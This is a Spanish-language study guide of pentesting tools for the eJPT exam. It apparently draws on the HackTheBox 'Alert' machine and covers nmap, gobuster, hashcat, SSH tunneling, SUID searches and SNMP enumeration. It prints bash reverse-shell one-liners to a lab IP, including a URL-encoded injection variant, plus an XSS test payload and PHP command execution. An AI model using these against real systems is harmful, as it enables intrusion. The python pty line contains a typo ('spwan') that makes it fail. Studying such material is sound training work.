# Herramientas que te pueden servir en el EJPT


## 1. Alert

### Escaneo de enumeración de recursos web (HTTP)

Realiza un escaneo de enumeración de recursos web (HTTP) en el puerto 80 del host alert.htb, usando Nmap, y guarda el resultado en un archivo llamado webScan.

```bash
nmap --script http-enum -p80 alert.htb -oN webScan
```
<br>

| Parte del comando    | Significado                                                                                                                                                       |
| -------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `nmap`               | Ejecuta Nmap, una herramienta para escaneo de red.                                                                                                                |
| `--script http-enum` | Usa el script NSE llamado `http-enum`, que intenta **descubrir directorios y archivos comunes** en servidores web (tipo `/admin`, `/login`, `/robots.txt`, etc.). |
| `-p80`               | Limita el escaneo al **puerto 80** (HTTP).                                                                                                                        |
| `alert.htb`          | Es el **objetivo**, probablemente una máquina en un entorno tipo HackTheBox.                                                                                      |
| `-oN webScan`        | Guarda la salida en **formato normal** (`-oN`) en un archivo llamado `webScan`.                                                                                   |

<br>
<br>


**📦 ¿Qué es http-enum?**

El script **http-enum** forma parte del motor de scripts de Nmap (NSE: Nmap Scripting Engine) y:

- Intenta detectar rutas sensibles o conocidas en servidores web.
- Se basa en una base de datos de rutas predefinidas.
- Puede ayudarte a encontrar puntos de entrada como:

```
/admin
/config
/phpmyadmin
/wordpress
/login
/test
```

📂 Resultado típico:
El archivo webScan podría contener algo como:

```
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /admin/             Possible admin folder
|   /robots.txt         Found robots.txt file
|   /wordpress/         WordPress install detected
|_  /login/             Login page
```



**✅ ¿Para qué te sirve esto?**
Ideal para:

- Reconocimiento en pentesting web.
- Enumerar rutas sin usar herramientas externas como gobuster o dirb.
- Saber qué recursos HTTP expone un servidor.


### WhatWeb

El comando utiliza **WhatWeb**, una herramienta de fingerprinting web, para detectar tecnologías utilizadas por un sitio web *(alert.htb en este caso)*.

```
whatweb http://alert.htb
```

**📦 ¿Qué detecta WhatWeb?**

WhatWeb analiza el sitio web y te dice cosas como:

- El servidor web (Apache, Nginx, IIS, etc.)
- El CMS (WordPress, Joomla, Drupal…)
- Bibliotecas JS (como jQuery, Bootstrap)
- Frameworks (Laravel, Express, etc.)
- Headers HTTP interesantes (cookies, X-Powered-By, etc.)
- Posibles tecnologías de seguimiento o seguridad (Google Analytics, reCAPTCHA, WAF, etc.)
- Versiones si están disponibles (como PHP/7.4.3)

**🧠 Ejemplo de salida:**

```bash

http://alert.htb [200 OK] Country[RESERVED][ZZ], IP[10.10.10.100], 
Apache[2.4.29], PHP[7.2.24], Ubuntu, 
X-Powered-By[PHP/7.2.24], 
Title[Login Page]

```


**📌 ¿Para qué sirve?**

- Para hacer reconocimiento web rápido.
- Descubrir vectores de ataque según versiones (ej: PHP desactualizado).
- Identificar la superficie tecnológica de un sitio antes de atacar.

### Payload Inicial XSS (Cross-Site Scripting)

Este es un payload básico de XSS (Cross-Site Scripting) que:

```js
<script>alert(0)</script>
```

- Inyecta una etiqueta `<script>` en una página web.
- Ejecuta el código JavaScript `alert(0)`, lo que muestra una ventana emergente (alert) con el número 0.

**🧠 ¿Por qué se usa alert(0) para probar XSS?**

Porque es una forma segura y visible de comprobar si la inyección de código JavaScript funciona.

**✅ Si aparece la alerta, significa que:**

- El navegador ejecutó tu código.
- La entrada no fue correctamente filtrada ni escapada.
- La página es potencialmente vulnerable a XSS.

**🚨 ¿Qué es XSS exactamente?**

XSS (Cross-Site Scripting) es una vulnerabilidad en aplicaciones web que permite a un atacante inyectar scripts maliciosos que se ejecutan en el navegador de otras personas.

**🔺 Un XSS exitoso puede permitir:**

Robar cookies o tokens de sesión.

- Redirigir a sitios maliciosos.
- Modificar el contenido de la página.
- Registrar pulsaciones del teclado (keylogger).
- Hacer ingeniería social desde el sitio real.



### Comando: python3 -m http.server 80
Este comando levanta un servidor web HTTP básico en el puerto 80 usando Python 3.

**📌 Qué hace:**

- Crea un servidor web que sirve archivos del directorio actual (donde ejecutaste el comando).
- Usa el módulo http.server incorporado en Python.
- Puedes acceder desde un navegador o con curl así:

```
http://<IP_DEL_HOST>:80/
``` 

🧠 **Ejemplo de uso:**

Estás en /home/user/Downloads y corres:


```python
python3 -m http.server 80
``` 

Entonces alguien desde otra máquina puede descargar archivos de esa carpeta desde:

```
http://tu-ip/
```

### Comando: nc -nlvp 6666

Este comando usa Netcat (nc) para escuchar conexiones entrantes en el puerto 6666.

**📌 Significado de las opciones:**

- n: no resuelve DNS.
- l: modo escucha.
- v: verbose (muestra más info).
- p 6666: puerto a escuchar.

**🧠 Ejemplo de uso:**

Sirve para cosas como:

- Esperar una reverse shell.
- Hacer transferencia de archivos.
- Chat simple por TCP.

### Searchsploit

**searchsploit** es una herramienta de línea de comandos que permite buscar exploits públicos conocidos en la base de datos de Exploit-DB, directamente desde tu terminal.

**🛠️ ¿Para qué sirve?**

Sirve para buscar vulnerabilidades ya documentadas que puedes usar durante un análisis de seguridad o prueba de penetración. Es muy útil para encontrar rápidamente exploits relacionados con software, sistemas operativos, servicios, etc.

**💻 Comando básico:**

```
bash
searchsploit nombre_del_software
``` 

Ejemplo: 

```bash
searchsploit enum ssh 7
``` 


### Fuzzear directorios (modo dir)

Busca directorios y archivos ocultos en un sitio web.

```bash
gobuster dir -u http://example.com -w /ruta/a/wordlist.txt
``` 

**🔧 Opciones comunes:**

- -u → URL del objetivo
- -w → Wordlist (por ejemplo, /usr/share/wordlists/dirb/common.txt)
- -x → Para buscar extensiones: .php,.html,.txt

**📌 Ejemplo completo:**

```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt
``` 

### Hashcat

**hashcat** es una herramienta potente para crackear hashes de contraseñas. Usa diccionarios, fuerza bruta, combinaciones y más. Es muy usada en CTFs, pentesting y recuperación de contraseñas.


**✅ Comando que usaste:**

```bash
hashcat hash /usr/share/wordlists/rockyou.txt --username
``` 

**🔍 ¿Qué hace?**

- hash → archivo con hashes (y posiblemente usuarios, en formato usuario:hash)

- /usr/share/wordlists/rockyou.txt → diccionario de contraseñas que probará

- --username → le dice a hashcat que el archivo tiene formato usuario:hash, y que debe considerar solo el hash

**🧪 ¿Qué hace internamente?**

- Lee cada línea del archivo hash
- Extrae el hash, ignorando el nombre de usuario
- Prueba contraseñas desde rockyou.txt
- Si encuentra coincidencia, lo muestra y puede guardarlo con el usuario original

### Como Matar un Proceso 

**✅ 1. Ver los procesos en ejecución**

Para listar todos los procesos:

```bash
ps aux
```

O para buscar uno específico (por nombre):

```bash
ps aux | grep nombre_del_proceso
```

**✅ 2. Matar un proceso con kill (por PID)**

Primero identifica el PID (Process ID), luego:

```bash
kill PID
``` 


### ¿Qué es el tunneling SSH?

Permite redirigir un puerto desde tu máquina local hacia un puerto de un servidor remoto (incluso uno que esté protegido o no expuesto públicamente). Sirve para acceder a servicios internos como webapps, bases de datos, paneles admin, etc.

🧭 Pasos para hacer TUNELING correctamente

**✅ 1. Verificar qué puertos están abiertos en la máquina remota**

Si tienes acceso SSH, puedes usar:

```bash
ss -nlpt
``` 

O también:

```bash
netstat -tulnp
``` 

Esto te muestra servicios internos corriendo como:


```bash
127.0.0.1:3306   (MySQL)
127.0.0.1:8000   (Panel web local)
``` 

**✅ 2. Crear el túnel con ssh -L**

La sintaxis básica es:

```bash
ssh -L [PUERTO_LOCAL]:[IP_OBJETIVO]:[PUERTO_OBJETIVO] usuario@IP_REMOTA
``` 


**📌 Ejemplo 1:** Acceder a una web oculta en localhost:8000 del servidor remoto
Editar

```bash
ssh -L 8888:127.0.0.1:8000 user@10.10.10.10
``` 

🔁 Esto significa:

Abre localhost:8888 en tu máquina, y se redirige a localhost:8000 del servidor remoto.

Ahora en tu navegador:


```
http://localhost:8888
``` 

Y verás lo que hay en 127.0.0.1:8000 del servidor remoto.

### Comandos en Consola con PHP

**✅ 1. system()**

Ejecuta un comando y muestra directamente la salida.


```php
<?php
system("ls -la");
?>
``` 

### Reverse Shell

**🎯 Objetivo:**

Ejecutar un comando en la máquina víctima que se conecta a tu IP y puerto, dándote una shell remota.

**✅ Reverse Shell clásica en Bash**

```bash
bash -i >& /dev/tcp/10.10.14.6/4444 0>&1
``` 

**🔍 ¿Qué hace?**

- bash -i → lanza bash en modo interactivo
- *>& /dev/tcp/... → redirige la entrada/salida hacia un socket TCP*
- 0>&1 → une la entrada estándar con la salida

**✅ Alternativa usando bash -c**

Útil cuando solo puedes ejecutar un comando tipo string:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
``` 

🔥 Muy útil si tienes una vulnerabilidad RCE o estás en una inyección.

⚠️ Versión con caracteres escapados (URL-encoded)
Cuando tienes que inyectar en una URL o campo web y los caracteres especiales (>, &, etc.) no se permiten directamente, puedes usar:

```bash
bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261'
``` 

**🧠 %26 = & en URL encoding**

📡 En tu máquina atacante (listener):
Antes de ejecutar la reverse shell, prepárate con:

```bash
nc -nlvp 443
``` 

#### Pasos para Tunear tu RevShell

```bash

# 1
script /dev/null -c bash

#2 
Ctrl + Z

#2.5
stty raw -echo; fg

#3
reset xterm


#4
export TERM=xterm
export SHELL=bash

#5 
stty size

#6
stty rows 45 columns 236

# EXTRA - Si no deja el comando de script
# Generate una bash con python o python3

python3 -c 'import pty; pty.spwan("/bin/bash")'


```


### Buscar Archivos con permiso SUID (4000)


```bash
find / -perm 4000 2>/dev/null
``` 

**🔍 ¿Qué hace?**

| Parte         | Significado                                          |
| ------------- | ---------------------------------------------------- |
| `find /`      | Busca recursivamente desde la raíz del sistema (`/`) |
| `-perm 4000`  | Busca archivos con el **bit SUID** activado          |
| `2>/dev/null` | Oculta errores como "Permission denied"              |


**🎯 ¿Qué es el SUID (4000)?**

SUID = Set User ID

Permite que el archivo (normalmente ejecutable) se ejecute con los permisos del propietario, normalmente root.

Muy útil en escaladas de privilegios 🧨

📌 Ejemplo de salida:

```bash
/usr/bin/passwd
/usr/bin/sudo
``` 

Estos archivos tienen el bit SUID porque necesitan ejecutarse con privilegios de root, aunque el usuario no sea root.


**🧪 Filtros adicionales:**

**🔸 1. Filtrar por grupo con -group:**

```bash
find / -perm -4000 -group scriptmanagement 2>/dev/null
``` 
🔎 Encuentra archivos con SUID cuyo grupo propietario sea scriptmanagement.

**🔸 2. Filtrar por propietario con -user:**

```bash
find / -perm -4000 -user root 2>/dev/null
``` 

🔎 Encuentra archivos SUID propiedad de root.

🔥 Combinando todo:

```bash
find / -type f -perm -4000 -user root -group root 2>/dev/null
``` 

- -type f → Solo archivos

- -perm -4000 → También válido (el guion - busca que el bit esté presente, aunque haya más permisos)


### Capabilities

``` bash
getcap -r / 2>/dev/null
``` 

**🔍 ¿Qué hace?**

- getcap → Lista las capabilidades especiales de archivos (como ejecutables)

- -r / → Busca recursivamente desde la raíz del sistema

- 2>/dev/null → Oculta errores (como permisos denegados)

**🎯 ¿Qué son las capabilities en Linux?**

Permiten a un binario ejecutar ciertas acciones sin ser SUID ni root completo.

Por ejemplo: permitir que python abra un raw socket sin ser root.


### Escaneo por UDP

**Comando:**

```
nmap -sU --top-ports 100 --open -T5 -vv -n <IP>
```

**¿Qué hace --top-ports 100?**

Escanea los 100 puertos UDP más comunes según estadísticas de uso, no los primeros 100 en orden numérico.

**Objetivo:**

Detectar servicios UDP populares como DNS (53), SNMP (161), NTP (123), etc., de forma rápida y eficiente.

### ¿Qué es el puerto UDP 161 y el protocolo SNMP?

**SNMP** significa **Simple Network Management Protocol** (Protocolo Simple de Administración de Red).

**✅ ¿Para qué sirve SNMP?**

SNMP se usa para monitorear y gestionar dispositivos de red, como:

- Routers
- Switches
- Firewalls
- Servidores
- Impresoras

Permite obtener información como:

- Uso de CPU, RAM, discos
- Estado de interfaces de red
- Logs y alertas del sistema
- Estadísticas de tráfico

**🛠️ ¿Qué es snmpwalk?**

**snmpwalk** es una herramienta de línea de comandos que interroga un dispositivo SNMP para obtener información en forma de árbol (tipo JSON, pero jerárquico).

Ejemplo de uso:

```bash
snmpwalk -v2c -c public 192.168.1.1
``` 

- -v2c: usa SNMP versión 2c
- -c public: "community string", como una contraseña (por defecto es "public")

- 192.168.1.1: IP del dispositivo a consultar

**📥 Esto devuelve decenas o cientos de variables del sistema, como:**


```bash
SNMPv2-MIB::sysName.0 = STRING: router-office
SNMPv2-MIB::sysUpTime.0 = Timeticks: (2311451) 6:25:14.51
...
``` 


```
``` 